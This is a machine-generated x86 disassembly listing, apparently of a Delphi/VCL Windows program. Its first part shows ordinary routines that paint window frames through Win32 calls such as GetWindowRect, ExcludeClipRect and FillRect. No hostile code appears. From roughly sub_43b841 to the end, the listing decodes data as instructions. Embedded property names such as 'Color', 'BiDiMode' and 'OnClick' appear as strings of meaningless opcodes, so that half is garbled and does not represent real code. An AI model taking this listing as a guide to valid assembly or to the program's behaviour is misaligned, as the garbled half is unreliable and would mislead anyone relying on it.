call sub_4036b4
mov eax esi
pop esi
pop ebx
retn
call sub_40370c
pop [ fs : 0x0 ]
add esp 0xc
sub_43af44
push ebx
push esi
call sub_40371c
mov ebx edx
mov esi eax
mov eax esi
call sub_43afe4
call sub_42be08
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403358
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403704
sub_43af78
push ebx
push esi
push edi
mov ebx edx
mov esi eax
cmp [ esi + 0x6 ] 0x0
je r-xdata
xor eax eax
mov al bl
mov eax [ esi + eax * 4 + 0x8 ]
pop edi
pop esi
pop ebx
retn
xor eax eax
mov al bl
cmp [ esi + eax * 4 + 0x8 ] 0x0
jne r-xdata
mov edi ebx
and edi 0x7f
mov eax [ edi * 4 + rw-data ]
push eax
push 0x0
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov [ esi + edi * 4 + 0x8 ] eax
sub_43afe4
push ebx
push esi
push edi
mov esi eax
xor ebx ebx
inc ebx
cmp bl 0x18
jne r-xdata
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
xor eax eax
mov [ esi + edi * 4 + 0x8 ] eax
mov edi ebx
and edi 0x7f
mov eax [ esi + edi * 4 + 0x8 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
retn
sub_43b028
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov esi ecx
lea edi [ ebp - 0xc ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov esi edx
mov ebx eax
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp + 0x14 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
push esi
mov dl [ ebp - 0xc ]
mov eax ebx
call sub_43af78
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x10
sub_43b074
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov esi ecx
lea edi [ ebp - 0xc ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov esi edx
mov ebx eax
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
push esi
mov dl [ ebp - 0xc ]
mov eax ebx
call sub_43af78
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_43b0b8
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov esi eax
mov eax [ ebp + 0x10 ]
cmp [ ebp + 0xc ] 0x0
je r-xdata
mov al 0x1
test eax eax
je r-xdata
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0xc
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov ebx eax
mov eax [ ebx + 0x8 ]
push eax
mov eax [ ebx + 0x4 ]
push eax
mov dl [ ebx ]
mov eax esi
call sub_43af78
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
cmp eax 0x1
sbb eax eax
inc eax
jmp r-xdata
test al al
je r-xdata
sub_43b120
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
push edi
mov esi [ ebp + 0x10 ]
lea edi [ ebp - 0x1c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov esi ecx
lea edi [ ebp - 0xc ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov edi edx
mov ebx eax
mov esi [ ebp + 0x14 ]
lea eax [ ebp - 0x1c ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax esi
call sub_4049b0
push eax
mov eax esi
call sub_4049a0
push eax
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
push edi
mov dl [ ebp - 0xc ]
mov eax ebx
call sub_43af78
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x10
sub_43b184
mov [ ecx ] 0x0
xor eax eax
mov al dl
cmp eax 0xf
jge r-xdata
add eax 0xfffffff1
sub eax 0xc
jb r-xdata
add eax 0xfffffffe
sub eax 0x5
jb r-xdata
mov [ ecx + 0x4 ] 0x3
mov eax 0xf
jmp r-xdata
sub eax 0x2
jb r-xdata
mov [ ecx + 0x4 ] 0x1
mov eax 0x2
jmp r-xdata
sub eax 0x8
jb r-xdata
and edx 0x7f
sub edx eax
inc edx
mov [ ecx + 0x8 ] edx
retn
mov [ ecx + 0x4 ] 0x4
mov eax 0x1b
jmp r-xdata
je r-xdata
mov [ ecx + 0x4 ] 0x2
mov eax 0x7
jmp r-xdata
jmp r-xdata
mov [ ecx + 0x4 ] 0x5
mov eax 0x1d
jmp r-xdata
jmp r-xdata
xor eax eax
mov [ ecx + 0x4 ] eax
xor eax eax
sub_43b208
mov [ ecx ] 0x3
mov eax edx
add al 0xfe
sub al 0x7
jb r-xdata
mov [ ecx + 0x4 ] 0x1
mov eax 0x2
jmp r-xdata
je r-xdata
and edx 0x7f
sub edx eax
inc edx
mov [ ecx + 0x8 ] edx
retn
mov [ ecx + 0x4 ] 0x2
mov eax 0x9
jmp r-xdata
jmp r-xdata
xor eax eax
mov [ ecx + 0x4 ] eax
xor eax eax
sub_43b244
mov [ ecx ] 0x12
xor eax eax
mov al dl
cmp eax 0x14
jge r-xdata
add eax 0xffffffec
sub eax 0x6
jb r-xdata
add eax 0xfffffffe
sub eax 0x6
jb r-xdata
mov [ ecx + 0x4 ] 0x4
mov eax 0x14
jmp r-xdata
sub eax 0x6
jb r-xdata
mov [ ecx + 0x4 ] 0x1
mov eax 0x2
jmp r-xdata
sub eax 0x6
jb r-xdata
and edx 0x7f
sub edx eax
inc edx
mov [ ecx + 0x8 ] edx
retn
mov [ ecx + 0x4 ] 0x5
mov eax 0x1a
jmp r-xdata
sub eax 0x6
jb r-xdata
mov [ ecx + 0x4 ] 0x2
mov eax 0x8
jmp r-xdata
sub eax 0x6
jb r-xdata
mov [ ecx + 0x4 ] 0x6
mov eax 0x20
jmp r-xdata
jmp r-xdata
mov [ ecx + 0x4 ] 0x3
mov eax 0xe
jmp r-xdata
jmp r-xdata
xor eax eax
mov [ ecx + 0x4 ] eax
xor eax eax
sub_43b2e0
mov [ ecx ] 0x17
xor eax eax
mov al dl
cmp eax 0x68
ja r-xdata
xor eax eax
mov [ ecx + 0x4 ] eax
xor eax eax
mov al [ eax + lookup_table_43b2fd ]
jmp [ eax * 4 + jump_table_43b366 ]
mov [ ecx + 0x4 ] 0x1
mov eax 0x2
jmp r-xdata
mov [ ecx + 0x4 ] 0x2
mov eax 0x5
jmp r-xdata
mov [ ecx + 0x4 ] 0x3
mov eax 0x8
jmp r-xdata
mov [ ecx + 0x4 ] 0x4
mov eax 0xb
jmp r-xdata
mov [ ecx + 0x4 ] 0x5
mov eax 0xe
jmp r-xdata
mov [ ecx + 0x4 ] 0x6
mov eax 0x11
jmp r-xdata
mov [ ecx + 0x4 ] 0x7
mov eax 0x14
jmp r-xdata
mov [ ecx + 0x4 ] 0x8
mov eax 0x16
jmp r-xdata
mov [ ecx + 0x4 ] 0x9
mov eax 0x18
jmp r-xdata
mov [ ecx + 0x4 ] 0xa
mov eax 0x1a
jmp r-xdata
mov [ ecx + 0x4 ] 0xb
mov eax 0x1c
jmp r-xdata
mov [ ecx + 0x4 ] 0xc
mov eax 0x1e
jmp r-xdata
mov [ ecx + 0x4 ] 0xd
mov eax 0x20
jmp r-xdata
mov [ ecx + 0x4 ] 0xe
mov eax 0x24
jmp r-xdata
mov [ ecx + 0x4 ] 0xf
mov eax 0x28
jmp r-xdata
mov [ ecx + 0x4 ] 0x10
mov eax 0x2c
jmp r-xdata
mov [ ecx + 0x4 ] 0x11
mov eax 0x30
jmp r-xdata
mov [ ecx + 0x4 ] 0x12
mov eax 0x34
jmp r-xdata
mov [ ecx + 0x4 ] 0x13
mov eax 0x38
jmp r-xdata
mov [ ecx + 0x4 ] 0x14
mov eax 0x3c
jmp r-xdata
mov [ ecx + 0x4 ] 0x15
mov eax 0x40
jmp r-xdata
mov [ ecx + 0x4 ] 0x16
mov eax 0x44
jmp r-xdata
mov [ ecx + 0x4 ] 0x17
mov eax 0x48
jmp r-xdata
mov [ ecx + 0x4 ] 0x18
mov eax 0x4c
jmp r-xdata
mov [ ecx + 0x4 ] 0x19
mov eax 0x50
jmp r-xdata
mov [ ecx + 0x4 ] 0x1a
mov eax 0x54
jmp r-xdata
mov [ ecx + 0x4 ] 0x1b
mov eax 0x58
jmp r-xdata
mov [ ecx + 0x4 ] 0x1c
mov eax 0x5c
jmp r-xdata
mov [ ecx + 0x4 ] 0x1d
mov eax 0x60
jmp r-xdata
mov [ ecx + 0x4 ] 0x1e
mov eax 0x61
jmp r-xdata
mov [ ecx + 0x4 ] 0x1f
mov eax 0x62
jmp r-xdata
mov [ ecx + 0x4 ] 0x20
mov eax 0x63
jmp r-xdata
mov [ ecx + 0x4 ] 0x21
mov eax 0x64
jmp r-xdata
mov [ ecx + 0x4 ] 0x22
mov eax 0x65
jmp r-xdata
mov [ ecx + 0x4 ] 0x23
mov eax 0x66
jmp r-xdata
mov [ ecx + 0x4 ] 0x24
mov eax 0x67
jmp r-xdata
mov [ ecx + 0x4 ] 0x25
mov eax 0x68
jmp r-xdata
and edx 0x7f
sub edx eax
inc edx
mov [ ecx + 0x8 ] edx
retn
sub_43b66c
push ebp
mov ebp esp
add esp 0xffffffbc
push ebx
push esi
push edi
mov ebx ecx
mov [ ebp - 0x4 ] edx
mov esi eax
push 0xffffffec
mov eax [ ebp - 0x4 ]
call sub_44f7b4
push eax
call GetWindowLongA
test ah 0x2
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
lea eax [ ebp - 0x28 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_44f7b4
push eax
call GetWindowRect
mov eax [ ebp - 0x24 ]
neg eax
push eax
mov eax [ ebp - 0x28 ]
neg eax
push eax
lea eax [ ebp - 0x28 ]
push eax
call OffsetRect
mov eax [ ebp - 0x4 ]
call sub_44f7b4
push eax
call GetWindowDC
mov [ ebp - 0x8 ] eax
xor edx edx
push ebp
push sub_43b7c7
push [ fs : edx ]
mov [ fs : edx ] esp
push esi
lea esi [ ebp - 0x28 ]
lea edi [ ebp - 0x18 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
test bl bl
je r-xdata
mov eax [ ebp - 0x1c ]
sub eax 0x2
push eax
mov eax [ ebp - 0x20 ]
sub eax 0x2
push eax
mov eax [ ebp - 0x24 ]
add eax 0x2
push eax
mov eax [ ebp - 0x28 ]
add eax 0x2
push eax
mov eax [ ebp - 0x8 ]
push eax
call ExcludeClipRect
lea ecx [ ebp - 0x34 ]
mov dl 0x2
mov eax esi
call sub_43b208
lea eax [ ebp - 0x28 ]
push eax
push 0x0
lea ecx [ ebp - 0x34 ]
mov edx [ ebp - 0x8 ]
mov eax esi
call sub_43b074
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_44f7b4
push eax
call ReleaseDC
retn
push 0xfffffff0
mov eax [ ebp - 0x4 ]
call sub_44f7b4
push eax
call GetWindowLongA
test eax 0x100000
je r-xdata
test eax 0x200000
je r-xdata
push 0x2
call GetSystemMetrics
mov edi eax
push 0x3
call GetSystemMetrics
mov ebx eax
push 0xfffffffe
push 0xfffffffe
lea eax [ ebp - 0x18 ]
push eax
call InflateRect
mov eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x44 ]
push eax
mov edx [ ebp - 0xc ]
sub edx ebx
mov eax [ ebp - 0x10 ]
sub eax edi
mov ecx [ ebp - 0x10 ]
call sub_417264
push esi
lea esi [ ebp - 0x44 ]
lea edi [ ebp - 0x18 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
push 0xf
call GetSysColorBrush
push eax
lea eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
call FillRect
sub_43b7f4
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_43b82f
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43b836
retn
mov eax [ rw-data ]
call sub_403368
mov eax rw-data
call sub_404164
sub_43b841
mov eax 0x43
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov [ ecx + 0x43 ] bh
add [ eax ] al
add [ eax ] al
add [ eax ] al
pop eax
mov ecx 0xb9720043
inc ebx
add [ eax ] dl
add al [ eax ]
add al dh
push esi
inc esp
add ah dh
sbb [ edx ] al
movsb [ edi ] [ esi ]
xor eax 0x12480040
inc edx
add [ ebp + esi - 0x2cd3ffc0 ] ch
inc esp
add [ eax ] al
xor eax [ eax ]
sbb al 0x33
inc eax
add [ esp + edx + 0x45 ] dh
add ah cl
add al [ ebp ]
hlt
sub_43babe
inc esp
add [ edi + esi * 8 ] dh
inc esp
add [ ebx + esi * 8 ] dl
inc ebx
add [ ecx ] cl
push esp
inc edi
jb r-xdata
inc ecx
add [ edi ] bl
add bh bh
jo r-xdata
jne r-xdata
add dh bh
fcom [ eax + 0x44 ]
add [ eax - 0x80000000 ] al
or eax 0x69420800
inc esp
imul ecx [ ebp + 0x6f ] 0x41e06564
add [ eax ] al
push [ eax ]
inc edx
outsd
js r-xdata
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
adc al [ eax ]
or [ edi + ebp * 2 + 0x63 ] al
imul edx [ ebx + 0x69 ] 0x74
clc
cmp al [ eax + eax + 0x7a ]
add [ eax ] al
imul ebp [ edi + 0x6e ] r-xdata
jo r-xdata
inc esp
add [ eax ] dl
pop [ eax + eax - 0x78 ]
mov es [ eax + eax - 0x64 ]
xchg ecx eax
inc esp
add [ eax - 0x70 ] cl
inc esp
add al cl
rol [ eax + eax + 0x8 ] 0x1
mov bl 0x44
add al ch
cmc
inc esp
add [ esi + esi * 8 - 0xe5fffbc ] ah
inc esp
add [ eax - 0x57ffbb0a ] cl
inc ebx
add [ esi + edi * 4 - 0x33abffbc ] dh
inc esp
add [ ebx + esi * 8 ] al
inc ebx
add [ ecx + ecx * 8 ] bh
inc esp
add [ edi + eax * 8 + 0x44 ] ch
add ah ch
int3
rcr al 0xba
inc ebx
add [ edi ] al
or [ edi + eax * 2 + 0x72 ] edx
outsd
jne r-xdata
add bh bh
push esp
xchg ecx eax
inc esp
add [ eax - 0x6f ] dh
inc esp
add [ edi + ecx * 4 - 0x701bffbc ] dh
inc esp
add al cl
add [ eax + 0x4208000d ] al
imul eax [ ecx + ebp * 2 + 0x4d ] 0xe065646f
inc ecx
inc edx
outsd
js r-xdata
inc esp
add [ eax ] al
add [ eax ] al
add [ 0xfff0000 ] 0x0
add eax 0x6f6c6f43
jb r-xdata
xchg ecx eax
inc edx
inc esp
add [ eax + eax ] dh
jmp [ eax + 0x10044b4 ]
mov ecx 0xb9840043
inc ebx
add [ 0x74530800 ] dh
inc ebx
je r-xdata
scasd [ edi ]
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4307000e ] al
popad
jo r-xdata
pop [ eax + eax - 0x38 ]
insb
jae r-xdata
add [ eax + eax + 0x7c ] 0x83
inc esp
add [ eax ] al
add [ eax ] al
add [ ebx ] 0x0
add [ eax ] al
or al 0x0
pop es
inc ecx
outsb
arpl [ eax + 0x6f ] bp
jb r-xdata
add [ eax ] dl
cmp eax [ eax + eax + 0x5b ]
add [ eax ] al
jmp [ eax + 0x1004484 ]
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
adc [ eax ] al
or eax [ ebx + 0x6f ]
outsb
jae r-xdata
cld
pop eax
add bh bh
fwait
jb r-xdata
or al [ edx + esi * 2 + 0x61 ]
inc ebx
jne r-xdata
imul ebp [ esi + 0x74 ] 0x40100073
[ eax - 0x47ffbb70 ]
jae r-xdata
or al 0x41
inc esp
add [ ebp ] bl
add bh bh
pushad
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
adc eax 0x72440800
popad
dec ebp
outsd
add [ gs : eax ] dl
inc eax
add [ eax ] dl
add dh bh
add [ fs : eax ] al
xor eax [ eax + eax + 0x10 ]
inc eax
add [ eax - 0x6f00ffff ] ch
jecxz r-xdata
add bh bh
test al 0x90
inc esp
add [ eax + 0x4490 ] bh
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x46040017 ] al
outsd
outsb
je r-xdata
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
adc al 0x0
or [ edx + esi * 2 + 0x61 ] al
dec ebx
imul ebp [ esi + 0x64 ] r-xdata
pop ebp
add [ eax ] al
jmp [ eax ]
[ ebx + 0x1ff0000 ]
adc [ eax ] al
xchg esp eax
or [ ebp ] eax
mov esp 0x1fe0000
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
sbb [ eax ] al
adc [ eax + 0x61 ] dl
jb r-xdata
outsb
je r-xdata
add [ eax ] al
inc ecx
inc esp
add [ ebx - 0x64010000 ] bl
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
sbb eax [ eax ]
or edx [ eax + 0x61 ]
outsb
je r-xdata
inc [ ecx ]
add [ ebp - 0xb00ffff ] ah
clc
inc esp
add [ eax ] bl
stc
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x43050011 ] al
je r-xdata
add [ eax ] dl
inc eax
add [ eax ] al
add [ eax - 0x80000000 ] al
push ds
add [ ecx ] cl
push eax
outsb
add [ eax ] al
add [ eax + 0x1 ] al
sbb al [ eax ]
or edx [ eax + 0x61 ]
jb r-xdata
popad
arpl [ ebx + 0x67 ] bp
jb r-xdata
aam 0x8e
inc esp
add [ eax - 0x50 ] cl
inc esp
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
and al [ eax ]
pop es
push esi
imul esi [ ebx + 0x69 ] 0x44656c62
pop edx
inc ecx
add [ eax ] ah
add [ eax ] eax
jmp [ eax ]
jo r-xdata
push cs
push eax
popad
je r-xdata
jb r-xdata
add [ ecx ] 0x0
add [ eax ] al
sbb eax 0x61500e00
outsb
je r-xdata
jb r-xdata
jne r-xdata
movsb [ edi ] [ esi ]
add [ eax ] eax
outsb
jne r-xdata
outsb
je r-xdata
outsd
xor eax [ eax + eax + 0x10 ]
inc eax
add [ ecx ] bl
add bh bh
loopne r-xdata
add [ edx ] cl
push eax
popad
outsd
insb
outsd
jb r-xdata
je r-xdata
outsb
add [ fs : eax ] dl
inc eax
add [ eax ] ah
add bh bh
insb
add [ eax ] al
inc [ ecx ]
add [ eax ] al
adc [ eax ] al
cdq
add [ eax ] al
inc [ ecx + edx * 4 ]
inc esp
add ah cl
nop
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x5308001f ] al
stc
push 0x6948776f
outsb
je r-xdata
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
sbb [ eax ] eax
push cs
push eax
popad
jb r-xdata
jb r-xdata
inc esp
add [ ecx ] al
add [ eax ] al
push 0x6948776f
outsb
je r-xdata
add [ eax - 0x80000000 ] al
pop ds
add [ eax ] cl
push ebx
outsb
je r-xdata
adc [ eax ] al
test eax 0x24ff0001
stc
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
sbb al 0x0
or dl [ eax + 0x61 ]
outsb
je r-xdata
inc esp
add al dl
stc
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
cmp bh 0xff
inc ecx
inc esp
add [ eax - 0x7 ] dl
inc ebx
add [ ebp ] 0x7c
add [ eax ] al
[ edi + ecx * 4 + 0x44 ]
jo r-xdata
or [ eax + 0x6f ] edx
outsd
outsb
je r-xdata
add [ eax ] al
add [ ebx ] bl
add [ ebx ] cl
push eax
popad
imul eax [ ecx + ebp * 2 + 0x4d ] 0x65646f
adc [ eax ] al
pop edx
add [ eax ] al
adc [ eax ] al
0x28ff0000 0x4491
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
sub_43c702
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f070024 ] al
outsb
inc ebx
insb
imul esp [ ebx + 0x6b ] r-xdata
xor [ ecx ] al
add bh bh
xor [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
and eax 0x6e4f0e00
inc ebx
outsd
outsb
je r-xdata
add [ eax ] al
js r-xdata
add [ eax ] al
dec edi
jbe r-xdata
cmp al 0x46
push eax
outsd
jo r-xdata
je r-xdata
inc esp
outsd
ja r-xdata
outsb
dec ebp
outsd
jne r-xdata
jb r-xdata
add [ eax ] al
add [ eax + 0x4f09002d ] al
outsb
dec ebp
outsd
jne r-xdata
add [ eax + 0x4f0b002b ] al
test al 0x43
add [ eax ] eax
dec [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f090029 ] al
outsb
inc ebp
outsb
inc esp
outsd
arpl [ ebx + 0x3c ] bp
inc esi
inc esp
add [ eax ] bl
add [ eax ] eax
[ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f09002a ] al
jo r-xdata
xor [ ecx ] 0x0
or ecx [ edi + 0x6e ]
jb r-xdata
and [ esp + eax * 2 ] al
fadd [ eax ]
add bh bh
fadd [ eax ]
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
sub al 0x0
or ecx [ edi + 0x6e ]
dec ebp
outsd
jne r-xdata
outsb
inc ebp
outsb
inc esp
jb r-xdata
add [ ecx ] cl
dec edi
inc esp
add [ eax ] cl
inc esi
push ebx
je r-xdata
inc esp
outsd
arpl [ ebx - 0xc ] bp
inc ebp
inc esp
add [ eax ] dl
add [ eax ] eax
call [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b0031 ] al
outsb
push ebp
jo r-xdata
inc esp
jb r-xdata
pop edx
inc ecx
add [ eax ] ch
add [ eax ] eax
[ eax ]
inc ebp
jbe r-xdata
jb r-xdata
je r-xdata
pop edx
inc ecx
add [ eax + 0x1 ] bh
add bh bh
js r-xdata
popad
jbe r-xdata
dec ebp
outsd
jbe r-xdata
outsd
jne r-xdata
pop edx
inc ecx
add [ eax - 0x7f00ffff ] al
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0c002e ] al
outsb
dec ebp
outsd
jne r-xdata
inc esp
add al dl
add [ eax ] al
call eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
inc ebx
jo r-xdata
dec ebp
popad
outsb
je r-xdata
inc ebx
outsd
outsb
je r-xdata
inc esp
jb r-xdata
or esp [ ebp + 0x63 ]
dec esp
outsd
ja r-xdata
jb r-xdata
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0c002f ] al
outsb
dec ebp
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
das
add [ edi + ecx * 2 ] cl
add [ eax ] al
add [ eax ] al
leave
inc ebx
add [ eax ] cl
cld
inc edi
inc esp
add [ eax ] al
add [ eax ] eax
inc [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b0030 ] al
outsb
push ebx
or al 0x4f
test al 0x43
inc esp
add al ah
add [ eax ] al
jmp eax
arpl [ gs : esi + 0x6f ] cx
jb r-xdata
dec esp
inc ebp
outsb
add [ eax + 0x4f0a0028 ] al
outsb
inc esp
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
inc ebp
inc esp
add al dh
add [ eax ] al
push eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add ah bh
jb r-xdata
add al 0x8
jb r-xdata
outsd
insb
add [ 0x65646e49 ] al
pop es
inc ebx
outsd
outsb
je r-xdata
add [ eax + ecx ] al
add al 0xc9
inc ebx
add [ ebx ] al
or eax 0x69644554
je r-xdata
jb r-xdata
jb r-xdata
mov eax eax
push eax
leave
inc ebx
push ebx
je r-xdata
popad
insb
or esp [ ebp + 0x63 ]
push ebp
jo r-xdata
hlt
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah ah
0x43
dec ecx
je r-xdata
jb r-xdata
outsd
insb
or edx [ edi + edx * 2 + 0x69 ]
outsb
inc eax
add [ eax - 0x67 ] ah
inc ecx
add [ eax - 0x67ffbe71 ] bl
fwait
inc ecx
add [ ebx ] dh
insb
add [ 0x65646e49 ] al
js r-xdata
adc [ edx + edx * 2 ] al
dec ecx
outsb
add [ eax ] cl
push cs
push esp
inc esp
jb r-xdata
push 0x61437261
jae r-xdata
je r-xdata
ja r-xdata
je r-xdata
popad
jae r-xdata
jae r-xdata
inc eax
ja r-xdata
jb r-xdata
je r-xdata
jb r-xdata
jb r-xdata
inc esp
add ah dh
sbb [ edx ] al
movsb [ edi ] [ esi ]
xor eax 0x12480040
inc edx
add [ ebp + esi - 0x2cd3ffc0 ] ch
insd
inc ebx
outsd
insd
bound ebp [ edi + 0x42 ]
outsd
js r-xdata
inc ecx
add [ eax - 0x5bffbfcb ] bl
xor eax 0x35a80040
add [ eax ] al
add [ eax ] al
insd
inc ebp
jbe r-xdata
inc eax
add [ ebp + esi + 0x35a00040 ] ch
inc eax
add [ eax ] al
xor eax [ eax ]
sbb al 0x33
test al 0x35
insb
or edx [ edi + edx * 2 + 0x69 ]
outsb
inc ebx
outsd
add [ esi ] eax
dec ecx
outsb
je r-xdata
outsd
jb r-xdata
js r-xdata
add eax 0x65646e49
add [ eax ] eax
add [ eax ] al
add [ edx ] al
add [ eax - 0x6bffbe66 ] dl
inc [ ebx ]
sbb al 0x9e
inc ecx
add ah bl
std
inc ebx
add al bh
std
inc ebx
add [ esi + ebx * 4 + 0x41 ] bh
add [ eax ] bl
mov [ 0xfffffffffe700041 ] eax
inc ebx
add [ esp - 0x5ac3ffbf ] dh
inc ecx
add [ edi + edi * 8 - 0x597bffbd ] ah
inc ecx
add [ eax - 0x4bffbe67 ] dl
cdq
inc ecx
add al bl
cdq
inc ecx
add ah ch
inc [ ebx ]
pop esp
inc [ ebx ]
xor al 0x9d
inc ecx
add [ eax ] ch
sahf
inc ecx
add [ edi + edi * 8 + 0x43 ] bh
add [ eax ] dh
mov al [ 0xffffffffa1040041 ]
inc ecx
add [ ebx + ebp + 0x40 ] cl
add [ eax ] bh
mov eax [ 0xffffffffa1680041 ]
inc ecx
add [ ecx - 0x5d97ffbf ] bh
inc ecx
add [ eax ] al
movsb [ edi ] [ esi ]
inc ecx
add [ eax - 0x5c ] bl
inc ecx
add ah ch
movsb [ edi ] [ esi ]
inc ecx
add [ esi ] dl
push esp
inc ebx
jne r-xdata
jb r-xdata
je r-xdata
popad
or [ ebx + 0x74 ] dl
inc ebx
je r-xdata
je r-xdata
dec eax
imul esp [ gs : edi + 0x68 ] 0x6e490774
push es
push 0x6e490774
andps xmm1 [ edi + 0x77 ]
outsb
outsb
je r-xdata
popad
jae r-xdata
add [ eax ] al
add [ eax ] al
mov esp cs
inc ebx
add ah bl
int3
je r-xdata
add [ eax ] al
in al 0xca
inc ebx
add [ eax + eax ] dl
add [ eax ] al
cld
outsb
je r-xdata
inc eax
add [ ebx + esi ] bl
jb r-xdata
arpl [ gs : ebp + eax + 0x54 ] si
push edx
arpl [ gs : eax + eax + 0x5 ] si
add al 0x52
test al 0x55
jb r-xdata
je r-xdata
inc eax
add [ eax + edx ] bh
inc eax
add [ ebx + 0x43ca64c0 ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al

cmp al 0x10
add [ ebx + 0x43c9c0c0 ] cl
add [ eax + 0x3c004455 ] ch
adc [ eax ] al
add [ eax ] al
add [ eax ] al
and al 0x64
inc eax
add [ eax ] cl
adc [ ebp + ecx * 2 + 0x65 ] edx
popad
mov eax eax
ror cl 0x43
insb
jae r-xdata
insd
push esp
dec edi
ja r-xdata
inc esp
